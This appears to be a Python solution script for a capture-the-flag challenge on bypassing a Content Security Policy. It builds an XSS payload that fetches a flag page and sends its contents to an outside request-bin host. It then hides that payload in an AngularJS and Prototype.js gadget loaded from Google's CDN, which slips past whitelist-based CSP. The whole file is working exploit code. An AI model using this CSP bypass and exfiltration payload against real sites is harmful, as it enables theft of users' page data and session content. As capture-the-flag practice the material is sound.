import sys
import base64

if len(sys.argv) != 3:
    print "Please specify challenge URL and Request bin URL"
    print "python solution.py http://challenge.host.com http://endiel6lj35l8.x.pipedream.net"
else:  
	vector = "var xhr = new XMLHttpRequest(); xhr.open('GET','" + sys.argv[1] + '/csp-two-flag'
	vector = vector + "', true); xhr.onload = function () { var request = new XMLHttpRequest(); request.open('GET', '"
	vector = vector + sys.argv[2] + "?flag='+xhr.responseText, true);request.send()};xhr.send(null);"
	print vector
	print '<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script><script src="//ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js"></script><div id="f" ng-app ng-csp ng-click="x=$on.curry.call()">{{x.eval(x.atob("' + base64.b64encode(vector) + '"))}}aaa</div><script async src="https://ajax.googleapis.com/jsapi?callback=f.click"></script>'
